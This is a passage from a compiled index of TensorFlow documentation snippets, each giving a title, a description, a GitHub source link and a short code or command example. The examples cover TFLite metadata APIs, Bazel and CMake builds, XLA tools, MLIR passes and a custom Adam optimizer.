LANGUAGE: Python
CODE:
```
for i in range(10):
  continue_ = False
  if i > 3:
    continue_ = True
  if not continue_:
    i += 1
```

----------------------------------------

TITLE: Checking Predicted Labels Shape - Python
DESCRIPTION: Demonstrates accessing and printing the shape of the array containing the predicted labels obtained after processing the raw output of a TFLite model inference. This helps confirm the dimensions of the resulting prediction array before it is used for evaluation or visualization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_24

LANGUAGE: Python
CODE:
```
predictions.shape
```

----------------------------------------

TITLE: Building TensorFlow Custom Op Python Wrapper Bazel Shell
DESCRIPTION: Executes the Bazel build command to compile the Python wrapper library for the `multiplex_4` custom TensorFlow op. This command processes the `py_strict_library` rule, ensuring that the Python file and its dependent C++ kernel shared library are built and ready for use or import in Python scripts. Requires Bazel configured for the TensorFlow source tree.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_10

LANGUAGE: Shell
CODE:
```
bazel build //third_party/tensorflow/examples/custom_ops_doc/multiplex_4:multiplex_4_op
```

----------------------------------------

TITLE: Configure CMake for TFLite Play Services
DESCRIPTION: Configures the CMake build script to find and link against the `tensorflowlite_jni_gms_client` package provided by Google Play services. It also adds necessary compile definitions (`TFLITE_IN_GMSCORE`, `TFLITE_WITH_STABLE_ABI`) for the C/C++ compiler.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/native.md#_snippet_2

LANGUAGE: CMake
CODE:
```
find_package(tensorflowlite_jni_gms_client REQUIRED CONFIG)

target_link_libraries(tflite-jni # your JNI lib target
        tensorflowlite_jni_gms_client::tensorflowlite_jni_gms_client
        android # other deps for your target
        log)

# Also add -DTFLITE_IN_GMSCORE -DTFLITE_WITH_STABLE_ABI
# to the C/C++ compiler flags.

add_compile_definitions(TFLITE_IN_GMSCORE)
add_compile_definitions(TFLITE_WITH_STABLE_ABI)
```

----------------------------------------

TITLE: Concatenating SparseTensors C++
DESCRIPTION: Demonstrates how to concatenate multiple SparseTensor objects along their primary dimension (order[0]). It shows the use of the static SparseTensor::Concat method and checks properties like nnz(), Shape(), and Order() on the resulting tensor, illustrating how input ordering affects output ordering.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/util/sparse/README.md#_snippet_2

LANGUAGE: C++
CODE:
```
Tensor ix1(DT_INT64, TensorShape({N1, 3});
Tensor vals1(DT_STRING, TensorShape({N1, 3});
Tensor ix2(DT_INT64, TensorShape({N2, 3});
Tensor vals2(DT_STRING, TensorShape({N2, 3});
Tensor ix3(DT_INT64, TensorShape({N3, 3});
Tensor vals3(DT_STRING, TensorShape({N3, 3});

SparseTensor st1(ix1, vals1, TensorShape({10, 20, 5}), {1, 0, 2});
SparseTensor st2(ix2, vals2, TensorShape({10, 10, 5}), {1, 0, 2});
// For kicks, st3 indices are out of order, but order[0] matches so we
// can still concatenate along this dimension.
SparseTensor st3(ix3, vals3, TensorShape({10, 30, 5}), {1, 2, 0});

SparseTensor conc = SparseTensor::Concat<string>({st1, st2, st3});
Tensor ix_conc = conc.indices();
Tensor vals_conc = conc.values();
EXPECT_EQ(conc.nnz(), st1.nnz() + st2.nnz() + st3.nnz());
EXPECT_EQ(conc.Shape(), TensorShape({10, 60, 5}));
EXPECT_EQ(conc.Order(), {-1, -1, -1});

// Reorder st3 so all input tensors have the exact same orders.
st3.Reorder<tstring>({1, 0, 2});
SparseTensor conc2 = SparseTensor::Concat<string>({st1, st2, st3});
EXPECT_EQ(conc2.Order(), {1, 0, 2});
// All indices' orders matched, so output is in order.
EXPECT_TRUE(conc2.IndicesValid());
```

----------------------------------------

TITLE: Getting CustomMetadata Data as NumPy Array in Python
DESCRIPTION: Retrieves the raw binary data stored within the `CustomMetadata` object as a NumPy array. This is useful for efficiently processing the data using NumPy's array operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadata.md#_snippet_2

LANGUAGE: python
CODE:
```
DataAsNumpy()
```

----------------------------------------

TITLE: Calculating Style Bottleneck for Content Image (Python)
DESCRIPTION: Calculates the style bottleneck vector for the content image itself. This is done by first preprocessing the content image to the 256x256 dimension required by the style prediction model, and then running the `run_style_predict` function on the preprocessed content image. This step is performed to enable blending the content's style into the final output. Requires the `run_style_predict` and `preprocess_image` functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/style_transfer/overview.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
# Calculate style bottleneck of the content image.
style_bottleneck_content = run_style_predict(
    preprocess_image(content_image, 256)
    )
```

----------------------------------------

TITLE: Defining Bazel Build Targets for Python Wrapper and Tests
DESCRIPTION: This Bazel code defines two build targets: `multiplex_1_op` (the Python wrapper library) and `multiplex_1_test` (the Python test suite). It specifies their source files, dependencies on other build targets (like the generated op and kernel) and third-party libraries, and sets visibility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_11

LANGUAGE: bazel
CODE:
```
py_strict_library(
    name = "multiplex_1_op",
    srcs = ["multiplex_1_op.py"],
    visibility = ["//third_party/tensorflow/google/g3doc:__subpackages__"],
    deps = [
        ":gen_multiplex_1_op",
        ":multiplex_1_kernel",
        "//third_party/py/tensorflow",
    ],
)

tf_py_strict_test(
    name = "multiplex_1_test",
    size = "medium",
    srcs = ["multiplex_1_test.py"],
    deps = [
        ":multiplex_1_op",
        "//third_party/py/numpy",
        "//third_party/py/tensorflow",
        "//third_party/tensorflow/python/framework:errors",
        "//third_party/tensorflow/python/framework:test_lib",
    ],
)
```

----------------------------------------

TITLE: Demonstrating AutoGraph Limitation with Python Lists Python
DESCRIPTION: Shows a function that uses standard Python list operations (`[]`, `append`) within a loop. When converted by `tf.autograph.to_graph`, this code is typically not valid or supported by default, highlighting a limitation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/intro.md#_snippet_5

LANGUAGE: Python
CODE:
```
def f(n):
  l = []
  for i in tf.range(n):
    l.append(i)
  return l

converted_f = tf.autograph.to_graph(f)
```

----------------------------------------

TITLE: Checking for Output Tensor Groups in Python
DESCRIPTION: Checks if the output tensor groups field is present or null within the schema. Use this method to verify if output tensor groups exist.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_24

LANGUAGE: python
CODE:
```
OutputTensorGroupsIsNone()
```

----------------------------------------

TITLE: InvokeContext Interface Definition (C++)
DESCRIPTION: Defines the interface for the InvokeContext class, passed to the op kernel during its execution. It provides methods for accessing input tensors (GetInput) and obtaining mutable output tensors (GetOutput) for writing results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/shim/README.md#_snippet_4

LANGUAGE: C++
CODE:
```
template <typename SubType>
class InvokeContext {
 public:
  // Read an input tensor
  ConstTensorViewOr GetInput(const int idx) const;
  // Get a mutable output tensor
  TensorViewOr GetOutput(const int idx, const Shape& shape) const;
};

```

----------------------------------------

TITLE: Getting Root FlatBuffer Object in Python
DESCRIPTION: A class method to obtain the root object from a FlatBuffer buffer. This is the primary method for deserializing the metadata from a byte buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_7

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Configuring Sparse Git Checkout for Android Audio Example - Bash
DESCRIPTION: Changes the current directory to the cloned 'examples' repository and then configures Git sparse checkout. This command sequence ensures that only the files within the specified directory (`lite/examples/audio_classification/android`) are checked out, reducing the amount of data downloaded.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_1

LANGUAGE: Bash
CODE:
```
cd examples
git sparse-checkout init --cone
git sparse-checkout set lite/examples/audio_classification/android
```

----------------------------------------

TITLE: Defining Kotlin Companion Object for Model Settings - Kotlin
DESCRIPTION: Declares a companion object in a Kotlin class to define constants related to the audio classification model's configuration. This includes display thresholds, result limits, overlap values, and model file names, centralizing settings for clarity and ease of modification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_3

LANGUAGE: Kotlin
CODE:
```
companion object {
  const val DISPLAY_THRESHOLD = 0.3f
  const val DEFAULT_NUM_OF_RESULTS = 2
  const val DEFAULT_OVERLAP_VALUE = 0.5f
  const val YAMNET_MODEL = "yamnet.tflite"
  const val SPEECH_COMMAND_MODEL = "speech.tflite"
}
```

----------------------------------------

TITLE: Downloading Zip Archive in Colab Python
DESCRIPTION: This snippet is specifically designed for execution within Google Colab. It attempts to import the `files` module from `google.colab` and, if successful, triggers the download of the created zip archive ('pose_classifier.zip') to the user's local machine.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_26

LANGUAGE: python
CODE:
```
# Download the zip archive if running on Colab.
try:
  from google.colab import files
  files.download('pose_classifier.zip')
except:
  pass
```

----------------------------------------

TITLE: Initializing ValueRangeT from Object (Python)
DESCRIPTION: A class method to initialize a `ValueRangeT` instance from an existing `valueRange` object. This method likely handles copying or converting data from another instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRangeT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    valueRange
)
```

----------------------------------------

TITLE: Registering Custom Checkpoint Saver in Python
DESCRIPTION: Provides the function signature for registering custom save and restore functions for specific Trackable objects during checkpointing. It requires a predicate function to identify objects and optional save/restore callback functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/saved_model/registration/README.md#_snippet_1

LANGUAGE: python
CODE:
```
tf.saved_model.register_checkpoint_saver(
    predicate, save_fn=None, restore_fn=None):
```

----------------------------------------

TITLE: Get Root As ScoreThresholdingOptions - Python
DESCRIPTION: Retrieves the root `ScoreThresholdingOptions` object from a given buffer. This is a class method used to deserialize data from a buffer starting at a specific offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Creating BertTokenizerOptionsT from Buffer - Python
DESCRIPTION: This class method is used to initialize a `BertTokenizerOptionsT` object directly from a byte buffer. It typically takes the buffer (`buf`) containing the serialized data and a starting position (`pos`) within the buffer as input. This method is useful for deserializing data into a Python object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptionsT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Execute run_hlo_module Example
DESCRIPTION: This specific command invocation runs the `run_hlo_module` tool on a file named `computation.hlo`. It targets the CUDA platform for execution and uses the Interpreter for correctness verification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_2

LANGUAGE: Command Line
CODE:
```
run_hlo_module --platform=CUDA --reference_platform=Interpreter computation.hlo
```

----------------------------------------

TITLE: Installing TFLite Support Python Package
DESCRIPTION: This command uses pip to install the `tflite-support` Python package from PyPI. This package contains the necessary libraries and tools, including the TextEmbedder API, for deploying TensorFlow Lite models in Python applications.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/text_embedder.md#_snippet_1

LANGUAGE: sh
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Building TensorFlow C++ Detector Bazel/bash
DESCRIPTION: This command uses Bazel to build the TensorFlow C++ MultiBox object detection executable. It assumes Bazel is installed and configured for TensorFlow builds. The `--config opt` flag is used to create an optimized build of the binary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/multibox_detector/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
bazel build --config opt tensorflow/examples/multibox_detector/...
```

----------------------------------------

TITLE: Getting Root As ModelMetadata from Buffer (Class Method)
DESCRIPTION: A class method to get the root object from a FlatBuffers buffer as a ModelMetadata instance. It initializes the object from the provided buffer and optional offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_5

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Accessing Specific Max Value in Python
DESCRIPTION: This instance method allows accessing a specific maximum value by its index `j` from the statistical data within the buffer. It retrieves the value at the given position.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_3

LANGUAGE: Python
CODE:
```
Max(
    j
)
```

----------------------------------------

TITLE: Specify setuptools Requirement with Hashes
DESCRIPTION: Specifies the 'setuptools' package at version 70.0.0 along with two valid SHA-256 hashes. This ensures that the installed package matches one of the specified versions and hashes, enhancing security during dependency installation. It is a common practice in Python dependency management with tools like pip.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/requirements_updater/numpy1_requirements/requirements_lock_3_10.txt#_snippet_0

LANGUAGE: Python Requirements
CODE:
```
setuptools==70.0.0 \
    --hash=sha256:54faa7f2e8d2d11bcd2c07bed282eef1046b5c080d1c32add737d7b5817b1ad4 \
    --hash=sha256:f211a66637b8fa059bb28183da127d4e86396c991a942b028c6650d4319c3fd0
```

----------------------------------------

TITLE: Initializing EmbeddingOptions in Python
DESCRIPTION: Creates a new instance of the `EmbeddingOptions` class with optional parameters. Allows configuring whether the resulting embedding vector should be L2 normalized and/or quantized to bytes. Dependencies: `typing.Optional` for type hinting.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/EmbeddingOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.EmbeddingOptions(\n    l2_normalize: Optional[bool] = None, quantize: Optional[bool] = None\n)
```

----------------------------------------

TITLE: Running Desktop Benchmark Tool
DESCRIPTION: This command executes the benchmark tool directly on the desktop environment. It specifies the graph file path, input layer name, shape, type, and output layer name as command-line arguments to the benchmark binary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/benchmark/README.md#_snippet_5

LANGUAGE: Bash
CODE:
```
bazel-bin/tensorflow/tools/benchmark/benchmark_model \
  --graph=tensorflow_inception_graph.pb \
  --input_layer="input:0" \
  --input_layer_shape="1,224,224,3" \
  --input_layer_type="float" \
  --output_layer="output:0"
```

----------------------------------------

TITLE: Building TF1 SavedModel with Builder API (Python)
DESCRIPTION: This snippet demonstrates the typical workflow for using the `SavedModelBuilder` in TensorFlow 1.x. It shows how to initialize the builder, add meta graphs with variables and assets, and finally save the model to the specified directory. It highlights the process of adding multiple meta graphs with different tag sets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/saved_model/README.md#_snippet_0

LANGUAGE: python
CODE:
```
export_dir = ...
...
builder = tf.saved_model.builder.SavedModelBuilder(export_dir)
with tf.Session(graph=tf.Graph()) as sess:
  ...
  builder.add_meta_graph_and_variables(sess,
                                       [tf.saved_model.tag_constants.TRAINING],
                                       signature_def_map=foo_signatures,
                                       assets_collection=foo_assets)
...
with tf.Session(graph=tf.Graph()) as sess:
  ...
  builder.add_meta_graph(["bar-tag", "baz-tag"])
...
builder.save()
```

----------------------------------------

TITLE: Initializing ValueRangeT from Packed Buffer (Python)
DESCRIPTION: A class method to initialize a `ValueRangeT` instance by deserializing data from a potentially 'packed' byte buffer (`buf`), optionally starting at a specific position (`pos`). This might be used for a specific serialization format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRangeT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Ending Bounding Box Properties - TFLite Metadata - Python
DESCRIPTION: This function finalizes the definition of a BoundingBoxProperties object within the FlatBuffer builder context. It is called after starting the properties and adding necessary fields. The `builder` object is required to complete the building process for the current structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesEnd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.BoundingBoxPropertiesEnd(
    builder
)
```

----------------------------------------

TITLE: Getting Minimum Value in Python
DESCRIPTION: This method retrieves the minimum value from the `ValueRange` instance. It takes no parameters and returns the stored minimum value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRange.md#_snippet_4

LANGUAGE: Python
CODE:
```
Min()
```

----------------------------------------

TITLE: Finalizing SentencePiece Tokenizer Options in TFLite Metadata (Python)
DESCRIPTION: This snippet shows the function signature for `SentencePieceTokenizerOptionsEnd`. This function is used to finalize the building process of a `SentencePieceTokenizerOptions` object within the TensorFlow Lite Support metadata schema. It requires a `builder` object as input, which represents the ongoing metadata structure being constructed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsEnd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.SentencePieceTokenizerOptionsEnd(
    builder
)
```

----------------------------------------

TITLE: Using AssociatedFileAddType in Python
DESCRIPTION: This snippet presents the Python signature for the `AssociatedFileAddType` function or constructor. It is part of the `tflite_support.metadata_schema_py_generated` module and is used with a `builder` and a `type` argument, likely to specify how an associated file should be added or referenced when building TFLite model metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileAddType.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.AssociatedFileAddType(
    builder, type
)
```

----------------------------------------

TITLE: Setting example Protobuf Output Files CMake
DESCRIPTION: Appends the expected output file paths (`.pb.h` and `.pb.cc`) for the `example.proto` definition to a list variable `example_generated_files`. This list will be used later to define the custom command for generation and the library target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/example/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
# Generate example proto .h, .cc and lib.
list(APPEND example_generated_files ${GEN_PROTO_DIR}/example.pb.h ${GEN_PROTO_DIR}/example.pb.cc)
```

----------------------------------------

TITLE: Running Python Source Directly (Bazel/Shell)
DESCRIPTION: This Bazel command directly runs the Python source file associated with the target `:foo`, allowing developers to see the script's output without the FileCheck validation step. This is useful for inspecting intermediate results or debugging the Python code itself.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/tests/tf_saved_model/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
bazel run :foo
```

----------------------------------------

TITLE: Installing tf-nightly Prerequisite
DESCRIPTION: This command installs the `tf-nightly` package using pip, which is required to access the `pyct` module and related APIs for experimenting with code transformations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_0

LANGUAGE: bash
CODE:
```
!pip install tf-nightly
```

----------------------------------------

TITLE: Get Vocabulary File List Length Python
DESCRIPTION: Returns the number of entries in the vocabulary file list. Useful for iterating through the available vocabulary files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptions.md#_snippet_6

LANGUAGE: python
CODE:
```
VocabFileLength()
```

----------------------------------------

TITLE: Running TensorFlow Custom Op Tests (GPU) - Shell
DESCRIPTION: Provides the shell command using Bazel to build the custom multiplex op tests with CUDA support and execute the test specifically targeting the GPU environment using the `_gpu` test target suffix.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_12

LANGUAGE: shell
CODE:
```
$ bazel test --config=cuda //third_party/tensorflow/google/g3doc/example/multiplex_2:multiplex_2_test_gpu
```

----------------------------------------

TITLE: Getting Maximum Value in Python
DESCRIPTION: This method retrieves the maximum value from the `ValueRange` instance. It takes no parameters and returns the stored maximum value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRange.md#_snippet_3

LANGUAGE: Python
CODE:
```
Max()
```

----------------------------------------

TITLE: List hlo-opt Passes
DESCRIPTION: This command invokes `hlo-opt` with the `--list-passes` option to display the names of all registered HLO passes available within the tool. This helps identify passes for debugging or execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_16

LANGUAGE: Command Line
CODE:
```
hlo-opt --list-passes
```

----------------------------------------

TITLE: Building TF Lite C API for Editor (Shell)
DESCRIPTION: This command uses Bazel to build the optimized TensorFlow Lite C API library (`tensorflowlite_c`) required for the Unity editor plugin. The generated shared library name and suffix are platform-dependent.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/examples/unity/TensorFlowLitePlugin/README.md#_snippet_0

LANGUAGE: sh
CODE:
```
bazel build -c opt //tensorflow/lite/c:tensorflowlite_c

```

----------------------------------------

TITLE: Suggested Command to Replay Specific Failed Trace (Shell)
DESCRIPTION: This command, typically provided in the output when using `mlir_replay` to find failures, replays a specific compilation trace (`.mlir-trace.pb`) and its corresponding HLO snapshot (`.snapshot.pb`). The `--print-changes-only` flag shows only passes where the result changes, and `--stop-after-first-failure` stops the process at the first detected miscompile.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir/tools/mlir_replay/README.md#_snippet_2

LANGUAGE: Shell
CODE:
```
run :mlir_replay -- --mlir-compilation-trace=/tmp/test-dump/module_1234.jit_something.mlir-trace.pb --hlo-snapshot=/tmp/test-dump/module_1234.jit_something.snapshot.56.pb --print-changes-only --stop-after-first-failure
```

----------------------------------------

TITLE: Running TensorFlow Python Label Image Demo Direct Bash
DESCRIPTION: Executes the `label_image.py` script directly using the `python3` interpreter. This method requires the TensorFlow Python package to be installed in the Python environment being used. It runs the Python implementation of the image classification demo.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/label_image/README.md#_snippet_5

LANGUAGE: bash
CODE:
```
python3 tensorflow/examples/label_image/label_image.py
```

----------------------------------------

TITLE: Upgrading Directory (No Copy) using tf_upgrade_v2 (Shell)
DESCRIPTION: Illustrates running the `tf_upgrade_v2` script on a directory tree while specifically telling it *not* to copy non-Python files. Only the `.py` files within the `--intree` path will be processed and output to the `--outtree` directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/compatibility/README.md#_snippet_2

LANGUAGE: Shell
CODE:
```
tf_upgrade_v2 --intree coolcode --outtree coolcode-upgraded --copyotherfiles False
```

----------------------------------------

TITLE: Implementing Custom Adam Optimizer Python
DESCRIPTION: This Python class implements the Adam optimization algorithm from scratch. It maintains moment estimates (`m` and `v`), handles bias correction, and applies gradient updates to variables.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_30

LANGUAGE: python
CODE:
```
class Adam:

  def __init__(self, learning_rate=0.001, b1=0.9, b2=0.999, eps=1e-7):
    self._lr = learning_rate
    self._b1 = b1
    self._b2 = b2
    self._eps = eps
    self._built = False

  def build(self, weights):
    self._m = tf.nest.map_structure(lambda x: tf.Variable(tnp.zeros_like(x)), weights)
    self._v = tf.nest.map_structure(lambda x: tf.Variable(tnp.zeros_like(x)), weights)
    self._step = tf.Variable(tnp.asarray(0, np.int64))
    self._built = True

  def _update(self, weights_var, grads, m_var, v_var):
    b1 = self._b1
    b2 = self._b2
    eps = self._eps
    step = tnp.asarray(self._step, np.float32)
    lr = self._lr
    weights = tnp.asarray(weights_var)
    m = tnp.asarray(m_var)
    v = tnp.asarray(v_var)
    m = (1 - b1) * grads + b1 * m  # First  moment estimate.
    v = (1 - b2) * (grads ** 2) + b2 * v  # Second moment estimate.
    mhat = m / (1 - b1 ** (step + 1))  # Bias correction.
    vhat = v / (1 - b2 ** (step + 1))   
    weights_var.assign_sub((lr * mhat / (tnp.sqrt(vhat) + eps)).astype(weights.dtype))
    m_var.assign(m)
    v_var.assign(v)

  def apply_gradients(self, weights, grads):
    if not self._built:
      self.build(weights)
    tf.nest.map_structure(lambda *args: self._update(*args), weights, grads, self._m, self._v)
    self._step.assign_add(1)

  @property
  def state(self):
    return (self._step, self._m, self._v)
```

----------------------------------------

TITLE: Add TensorFlowLite Swift Dependency (Bazel)
DESCRIPTION: Adds the TensorFlow Lite Swift library as a dependency to a `swift_library` target within a Bazel BUILD file. This integrates the local build of TFLite Swift into the Bazel build process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_13

LANGUAGE: Bazel
CODE:
```
swift_library(
  deps = [
      "//tensorflow/lite/swift:TensorFlowLite",
  ],
)
```

----------------------------------------

TITLE: Creating Tuple in XLA (C++)
DESCRIPTION: This pseudocode snippet demonstrates the conceptual creation of an XLA Tuple using the `tuple` operation. It shows how to combine two different types of data (a float array and an integer scalar) into a single tuple structure. This is analogous to `std::tuple` in C++.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_37

LANGUAGE: C++
CODE:
```
let v: f32[10] = f32[10]{0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
let s: s32 = 5;
let t: (f32[10], s32) = tuple(v, s);
```

----------------------------------------

TITLE: Transforming tf.IfRegion to tf.If in MLIR
DESCRIPTION: This snippet shows how the `-tf-region-control-flow-to-functional` pass converts a region-based `tf.IfRegion` operation into its functional equivalent `tf.If`. It demonstrates the change in syntax and structure while maintaining the underlying logic of conditional execution. The pass requires the original operation to be `tf.IfRegion` or `tf.WhileRegion`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_35

LANGUAGE: MLIR
CODE:
```
    %0 = "tf.IfRegion"(%arg0) ( {
      %1 = call @then_branch_func(%arg1) : (tensor<*xf32>) -> tensor<*xf32>
      "tf.Yield"(%1) : (tensor<*xf32>) -> ()
    },  {
      %1 = call @else_branch_func(%arg1) : (tensor<*xf32>) -> tensor<*xf32>
      "tf.Yield"(%1) : (tensor<*xf32>) -> ()
    }) {is_stateless = false} : (tensor<i1>) -> tensor<*xf32>
```

LANGUAGE: MLIR
CODE:
```
  %0 = "tf.If"(%arg0, %arg1) {
    then_branch = @then_branch_func, else_branch = @else_branch_func, is_stateless = false
  } : (tensor<i1>, tensor<*xf32>) -> tensor<*xf32>
```

----------------------------------------

TITLE: Downloading Image Classifier Example Files (Shell)
DESCRIPTION: Uses shell commands (`!curl`) to download the required example files for demonstrating detailed image classifier metadata. It fetches the TFLite model file (`mobilenet_v2_1.0_224.tflite`) and the label file (`mobilenet_labels.txt`) from their GitHub locations. These files are prerequisites for creating and populating detailed metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_19

LANGUAGE: Shell
CODE:
```
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/image_classifier/mobilenet_v2_1.0_224.tflite -o mobilenet_v2_1.0_224.tflite
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/image_classifier/labels.txt -o mobilenet_labels.txt
```

----------------------------------------

TITLE: Checking JAX Version
DESCRIPTION: Imports the jax library and prints its version to ensure it meets the minimum requirement (0.4.20 or above) needed for the features used in the conversion process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_2

LANGUAGE: Python
CODE:
```
# Make sure your JAX version is at least 0.4.20 or above.
import jax
jax.__version__
```

----------------------------------------

TITLE: Initializing Model Metadata Builder in Python
DESCRIPTION: Starts the building process for TFLite model metadata using a FlatBuffers builder object. This low-level function is typically called before adding specific metadata fields to the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataStart(
    builder
)
```

----------------------------------------

TITLE: Adding Default Size to Image Properties (TFLite Support Python)
DESCRIPTION: This Python function is part of the TensorFlow Lite Support library's metadata generation tools. It is used with a FlatBuffers builder to add a default size (`defaultSize`) to an ImageProperties object during the metadata building process. It requires an active FlatBuffers builder instance.
